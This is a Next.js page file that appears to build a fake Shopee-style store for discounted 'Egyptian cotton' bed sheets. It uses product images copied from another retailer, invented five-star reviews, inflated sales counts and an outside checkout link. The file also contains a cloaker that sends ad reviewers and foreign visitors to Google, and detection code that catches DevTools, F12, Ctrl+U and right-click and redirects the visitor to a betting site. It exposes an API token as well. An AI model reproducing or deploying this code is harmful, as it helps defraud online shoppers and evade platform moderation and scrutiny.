// src/app/page.js
'use client'

import { useEffect, useState } from 'react'
import TopBar from '@/components/TopBar'
import ProductCarousel from '@/components/ProductCarousel'
import ProductInfo from '@/components/ProductInfo'
import Reviews from '@/components/Reviews'
import RecommendedProducts from '@/components/RecommendedProducts'
import Footer from '@/components/Footer'

const CLOAKER_CONFIG = {
  enabled: false,
  filters: {
    location: {
      enabled: true,
      apiToken: '8a7c777b62c246e39c6e08de41b457e7',
    },
    parameter: {
      enabled: true,
      name: 'acesso',
      value: 'true'
    }
  },
  redirect: {
    url: 'https://www.google.com',
  },
  loading: {
    time: 2000,
    enabled: true
  }
}

const PROTECTION_CONFIG = {
  enabled: true, // Ativa/desativa todas proteções
  redirectUrl: 'https://lua777bet.online/', // URL para redirecionamento quando detectar DevTools
}

function getProductData() {
  return {
    id: 1,
    name: 'Jogo de Lençol + Kit de Fronhas Grátis (100% algodão egípcio)',
    price: 97.00,
    checkoutUrl: 'https://pay.compra-blindada.site/v7R0gl9RLxV3Vr9',
    oldPrice: 899.99,
    installmentOldPrice: 899.99,
    installmentPrice: 32.33,
    pixPrice: 97.00,
    soldCount: 11.393,
    rating: 5.0,
    promotion: {
      couponsAvailable: 2304,
      discountPercentage: 90,
      showBlackFriday: true
    },
    images: [
      'https://hoomy.com.br/cdn/shop/files/2222_1_1_da97990d-8360-40f7-88c9-c2e170ff4c1b_2048x2048.png?v=1730480440',
      'https://hoomy.com.br/cdn/shop/files/sitePrancheta2_65fd9c39-0240-4866-bd99-616f6e183c90_2048x2048.jpg?v=1730480143',
      'https://hoomy.com.br/cdn/shop/files/sitePrancheta3_8da5c8cf-76c2-459c-98a1-15747f4ec65f_2048x2048.jpg?v=1730480143',
      'https://hoomy.com.br/cdn/shop/files/sitePrancheta4_abc87c1e-8c5a-4fa6-9037-5ea017b50c18_2048x2048.jpg?v=1730480143',
      'https://hoomy.com.br/cdn/shop/files/sitePrancheta5_249f130d-4d33-4370-87a4-6ba486957ca0_2048x2048.jpg?v=1730480142',
      'https://hoomy.com.br/cdn/shop/files/sitePrancheta6_8a885316-644b-487a-80bc-2a51bd79b132_2048x2048.jpg?v=1730480143',
      'https://hoomy.com.br/cdn/shop/files/sitePrancheta7_3ef2a7a2-2cb1-4e16-88fc-45d756064267_2048x2048.jpg?v=1730480143',
      'https://hoomy.com.br/cdn/shop/files/sitePrancheta8_43687f42-b426-4d3b-b6ab-a66ed97d2651_2048x2048.jpg?v=1730480143',
      'https://hoomy.com.br/cdn/shop/files/sitePrancheta11_d772dc58-8952-48c5-a90e-742b2b939fd5_2048x2048.jpg?v=1730480143',
      'https://hoomy.com.br/cdn/shop/files/sitePrancheta12_8d63fc34-a31c-4827-bf46-13aceb5b70b1_2048x2048.jpg?v=1730480143',
      'https://hoomy.com.br/cdn/shop/files/sitePrancheta14_1_8127da5c-3f96-466d-a2dd-ccf20b4a46b6_2048x2048.jpg?v=1730480143',
      'https://hoomy.com.br/cdn/shop/files/sitePrancheta16_1_e7a3e7b3-72b5-4b8e-8171-70e6cf29fef3_2048x2048.jpg?v=1730480143',
      'https://hoomy.com.br/cdn/shop/files/Instagrampost-5_729182e4-c348-4eb6-bfe7-e19a87de7b26_2048x2048.jpg?v=1728408876',
      'https://hoomy.com.br/cdn/shop/files/Instagrampost-2_dab425ba-3145-4098-ad71-30a6ca8c69e2_2048x2048.jpg?v=1728408856',
      'https://hoomy.com.br/cdn/shop/files/Instagrampost-6_b368991f-e358-4510-8a00-3b8cd5979034_2048x2048.jpg?v=1728408854',
      'https://hoomy.com.br/cdn/shop/files/Instagrampost-1_30e19c4f-4af6-4216-9337-7b3dbdb4a282_2048x2048.jpg?v=1728408858'
    ],
    reviews: [
      {
        id: 1,
        username: 'Ana de Maria',
        avatar: 'https://lua777bet.online/operacoes/shopee-avaliacoes/cama/mulher1.png',
        rating: 5,
        date: '18/11/2024',
        text: 'Produto maravilhoso! O tecido é de excelente qualidade, super macio e confortável. O acabamento é impecável e as cores são exatamente como nas fotos. Melhor custo benefício que já encontrei!',
        images: ['https://lua777bet.online/operacoes/shopee-avaliacoes/cama/mulher1-foto1.png', 'https://lua777bet.online/operacoes/shopee-avaliacoes/cama/mulher1-foto2.png', 'https://lua777bet.online/operacoes/shopee-avaliacoes/cama/mulher1-foto3.png'],
        attributes: {
          costBenefit: 'Excelente',
          asAdvertised: 'Sim'
        }
      },
      {
        id: 2,
        username: 'Carlos Silva',
        avatar: 'https://lua777bet.online/operacoes/shopee-avaliacoes/cama/homem1.png',
        rating: 5,
        date: '17/11/2024',
        text: 'Simplesmente perfeito! A qualidade do algodão é excepcional, não solta tinta na lavagem e é super resistente. As fronhas de brinde são um diferencial. Super recomendo!',
        images: ['https://lua777bet.online/operacoes/shopee-avaliacoes/cama/homem1-foto1.png', 'https://lua777bet.online/operacoes/shopee-avaliacoes/cama/homem1-foto2.png', 'https://lua777bet.online/operacoes/shopee-avaliacoes/cama/homem1-foto3.png', 'https://lua777bet.online/operacoes/shopee-avaliacoes/cama/homem1-foto4.png'],
        attributes: {
          costBenefit: 'Ótimo',
          asAdvertised: 'Sim'
        }
      },
      {
        id: 3,
        username: 'Maria Santos',
        avatar: 'https://lua777bet.online/operacoes/shopee-avaliacoes/cama/mulher2.png',
        rating: 5,
        date: '20/11/2024',
        text: 'Chegou super rápido e muito bem embalado. O jogo de lençol é lindo, a qualidade é incrível e o preço está excelente. Já comprei outros produtos da marca e nunca me decepciono!',
        images: ['https://lua777bet.online/operacoes/shopee-avaliacoes/cama/mulher2-foto1.png', 'https://lua777bet.online/operacoes/shopee-avaliacoes/cama/mulher2-foto2.png'],
        attributes: {
          costBenefit: 'Excelente',
          asAdvertised: 'Sim'
        }
      }
    ],
    description: {
      text: `Jogo de Lençol + Kit de Fronhas Grátis (100% Algodão Egípcio)
    
    Transforme suas noites de sono em uma experiência de puro conforto e sofisticação com o Jogo de Lençol Hoomy. Fabricado com 100% algodão egípcio, conhecido mundialmente por sua maciez incomparável, alta durabilidade e acabamento luxuoso, este jogo de lençol é perfeito para quem busca qualidade e elegância.
    
    O kit inclui um conjunto completo de lençóis e um kit de fronhas extra como brinde, proporcionando praticidade e um toque especial ao seu enxoval. Com design moderno, toque suave e ótima respirabilidade, ele se adapta perfeitamente ao seu colchão, garantindo conforto em todas as estações do ano.
    
    Características principais:
    - Tecido: 100% algodão egípcio fio penteado, de alta gramatura.
    - Toque macio e acetinado para um conforto incomparável.
    - Alta durabilidade ideal para uso prolongado.
    - Kit de fronhas grátis para maior conveniência.
    - Disponível em cores neutras e sofisticadas, que combinam com qualquer decoração.
    
    Invista no descanso que você merece com o Jogo de Lençol Hoomy, a escolha perfeita para noites de sono tranquilas e cheias de estilo.`,
      image: 'https://hoomy.com.br/cdn/shop/files/Instagrampost-6_b368991f-e358-4510-8a00-3b8cd5979034_2048x2048.jpg?v=1728408854'
    },    
    variants: {
      version: {
        show: true,
        title: 'COR',
        options: ['Light Grey', 'New York', 'Branco', 'Celestial Blue']
      },
      capacity: {
        show: true,
        title: 'TAMANHO',
        options: ['Solteiro King', 'Casal', 'Queen','King']
      }
    },
    recommendations: [
      {
        id: 1,
        name: 'Jogo de Lençol + Kit de Fronhas Grátis (100% algodão egípcio)',
        image: 'https://hoomy.com.br/cdn/shop/files/2222_1_1_da97990d-8360-40f7-88c9-c2e170ff4c1b_2048x2048.png?v=1730480440',
        oldPrice: 899.99,
        price: 97.00,
        discount: 90,
        url: 'https://pay.compra-blindada.site/v7R0gl9RLxV3Vr9'
      }
    ],
    reviewStats: {
      totalReviews: 1.211,
      averageRating: 5.0,
      tags: [
        { text: 'Amei o produto', count: 187 },
        { text: 'Recomendo', count: 175 },
        { text: 'Entrega rápida', count: 132 }
      ]
    }
  }
}

export default function JogoDeCama1() {
  const [loading, setLoading] = useState(CLOAKER_CONFIG.enabled)
  const [productData, setProductData] = useState(null)

  useEffect(() => {
    if (PROTECTION_CONFIG.enabled) {
      // Função para detectar DevTools
      const detectDevTools = () => {
        const widthThreshold = window.outerWidth - window.innerWidth > 160
        const heightThreshold = window.outerHeight - window.innerHeight > 160
        
        if (widthThreshold || heightThreshold) {
          window.location.href = PROTECTION_CONFIG.redirectUrl
        }
      }

      // Detecta DevTools por diferença de tamanho
      window.addEventListener('resize', detectDevTools)
      setInterval(detectDevTools, 1000)

      // Atalhos do teclado
      document.addEventListener('keydown', (e) => {
        // Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+Shift+C, F12, Ctrl+U
        if (
          (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) ||
          e.key === 'F12' ||
          (e.ctrlKey && e.key === 'U')
        ) {
          e.preventDefault()
          window.location.href = PROTECTION_CONFIG.redirectUrl
        }
      })

      // Desabilita clique direito
      document.addEventListener('contextmenu', e => e.preventDefault())

      // Debug tools detector
      let elemento = new Image()
      Object.defineProperty(elemento, 'id', {
        get: function() {
          window.location.href = PROTECTION_CONFIG.redirectUrl
        }
      })
      
      // Monitora console.log
      const consoleLog = window.console.log
      window.console.log = function() {
        if (arguments[0] === '%c') {
          window.location.href = PROTECTION_CONFIG.redirectUrl
        }
        consoleLog.apply(null, arguments)
      }

      return () => {
        window.removeEventListener('resize', detectDevTools)
        document.removeEventListener('contextmenu', e => e.preventDefault())
      }
    }
  }, [])

  useEffect(() => {
    async function init() {
      if (!CLOAKER_CONFIG.enabled) {
        setProductData(getProductData())
        return
      }

      try {
        let isValid = true

        if (CLOAKER_CONFIG.filters.parameter.enabled) {
          const urlParams = new URLSearchParams(window.location.search)
          const accessParam = urlParams.get(CLOAKER_CONFIG.filters.parameter.name)
          if (accessParam !== CLOAKER_CONFIG.filters.parameter.value) {
            isValid = false
          }
        }

        if (isValid && CLOAKER_CONFIG.filters.location.enabled) {
          try {
            const response = await fetch(`https://api.findip.net/${CLOAKER_CONFIG.filters.location.apiToken}`)
            const data = await response.json()
            const isFromBrazil = data?.country?.iso_code === 'BR'
            if (!isFromBrazil) isValid = false
          } catch (error) {
            console.warn('Erro ao verificar localização:', error)
          }
        }

        if (!isValid) {
          window.location.href = CLOAKER_CONFIG.redirect.url
          return
        }

        if (window.location.search) {
          const newurl = window.location.protocol + "//" + window.location.host + window.location.pathname
          window.history.pushState({ path: newurl }, '', newurl)
        }

        if (CLOAKER_CONFIG.loading.enabled) {
          await new Promise(resolve => setTimeout(resolve, CLOAKER_CONFIG.loading.time))
        }

        setProductData(getProductData())
        setLoading(false)
      } catch (error) {
        console.warn('Erro:', error)
        setProductData(getProductData())
        setLoading(false)
      }
    }

    init()
  }, [])

  if (loading && CLOAKER_CONFIG.enabled) {
    return (
      <div className="loading-container">
        <div className="loading-spinner"></div>
        <span>Carregando...</span>
        <style jsx>{`
          .loading-container {
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            background: white;
            gap: 12px;
            z-index: 9999;
          }
          .loading-spinner {
            width: 40px;
            height: 40px;
            border: 3px solid #f3f3f3;
            border-top: 3px solid #EE4D2D;
            border-radius: 50%;
            animation: spin 1s linear infinite;
          }
          .loading-container span {
            color: #666;
            font-size: 14px;
          }
          @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
          }
        `}</style>
      </div>
    )
  }

  if (!productData) return null

  return (
    <main style={{ userSelect: 'none' }}>
      <TopBar promotionData={productData.promotion} />
      <ProductCarousel images={productData.images} />
      <ProductInfo product={productData} />
      <Reviews 
        reviews={productData.reviews} 
        stats={productData.reviewStats}
      />
      <RecommendedProducts products={productData.recommendations} />
      <Footer />
    </main>
  )
}